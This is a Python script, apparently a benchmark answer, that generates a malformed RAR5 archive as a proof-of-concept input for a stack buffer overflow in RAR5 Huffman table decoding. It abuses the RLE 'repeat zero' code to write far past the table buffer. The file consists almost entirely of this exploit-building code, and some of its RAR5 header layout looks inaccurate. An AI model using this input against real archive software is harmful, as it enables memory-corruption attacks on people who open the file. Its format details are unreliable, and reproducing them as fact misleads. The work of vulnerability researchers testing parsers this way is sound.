import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 Signature
        sig = b'\x52\x61\x72\x21\x1A\x07\x01\x00'
        
        def vint(n):
            out = bytearray()
            while n >= 0x80:
                out.append((n & 0x7F) | 0x80)
                n >>= 7
            out.append(n)
            return bytes(out)

        # 1. Main Archive Header (Type 1)
        # Structure: CRC(4) | Size(vint) | Type(vint) | Flags(vint)
        mh_type = vint(1)
        mh_flags = vint(0)
        mh_data = mh_type + mh_flags
        mh_size = vint(len(mh_data))
        mh_crc = struct.pack('<I', zlib.crc32(mh_data) & 0xFFFFFFFF)
        main_header = mh_crc + mh_size + mh_data

        # 2. Payload Construction (Compressed Data)
        # The vulnerability is a Stack Buffer Overflow in RAR5 Huffman table parsing.
        # It typically occurs during RLE expansion of code lengths if bounds checks are insufficient.
        # We construct a malicious bitstream that uses the "Repeat Zero" RLE code to overflow the table buffer.
        
        # Step A: Define BitLength Huffman Table (20 codes).
        # We set index 18 (RLE Zero, 11-138 repeats) to have length 1 bit.
        # All other indices (0-17, 19) set to 0 (unused).
        # In RAR5, these are stored as 20 nibbles (4 bits each).
        # Bytes: 9 bytes of 0x00, then 0x10 (High nibble=1 for index 18, Low=0 for index 19).
        bl_table = b'\x00' * 9 + b'\x10'
        
        # Step B: Generate RLE Stream.
        # With BitLength[18]=1, the symbol 18 is assigned code '0' (1 bit).
        # Symbol 18 takes a 7-bit argument for repeat count (value + 11).
        # We want maximum repeats (127 + 11 = 138 zeros).
        # Bitstream: '0' (1 bit) + '1111111' (7 bits) = '01111111' = 0x7F.
        # Repeating 0x7F bytes generates a stream of maximal RLE Zero commands.
        # 450 bytes * 138 zeros/byte ~= 62,100 entries.
        # This should overflow any typical stack-based table buffer (e.g. 4KB, 16KB).
        payload_stream = b'\x7F' * 450
        
        payload_data = bl_table + payload_stream
        
        # 3. File Header (Type 2)
        # Fields: Flags, ExtraSize, DataSize, Attributes, UnpSize, HashType, Hash, CompInfo, HostOS, NameLen, Name
        fh_flags = vint(0x0001) # FLAG_HAS_DATA
        fh_extra = vint(0)
        fh_data_size = vint(len(payload_data))
        fh_attr = vint(0)
        fh_unp_size = vint(1024 * 1024) # 1MB (arbitrary)
        fh_hash_type = vint(0) # CRC32
        fh_hash = b'\x00\x00\x00\x00' # Dummy CRC
        fh_comp_info = vint(1) # Method 1 (Fastest), Dict 128KB
        fh_host = vint(0)
        name = b'poc'
        fh_name_len = vint(len(name))
        
        fh_fields = (fh_flags + fh_extra + fh_data_size + fh_attr + fh_unp_size + 
                     fh_hash_type + fh_hash + fh_comp_info + fh_host + fh_name_len + name)
        
        fh_type = vint(2)
        fh_data_block = fh_type + fh_fields
        fh_size = vint(len(fh_data_block))
        fh_crc = struct.pack('<I', zlib.crc32(fh_data_block) & 0xFFFFFFFF)
        file_header = fh_crc + fh_size + fh_data_block
        
        # 4. End of Archive Header (Type 5)
        ea_type = vint(5)
        ea_flags = vint(0)
        ea_data = ea_type + ea_flags
        ea_size = vint(len(ea_data))
        ea_crc = struct.pack('<I', zlib.crc32(ea_data) & 0xFFFFFFFF)
        end_header = ea_crc + ea_size + ea_data

        return sig + main_header + file_header + payload_data + end_header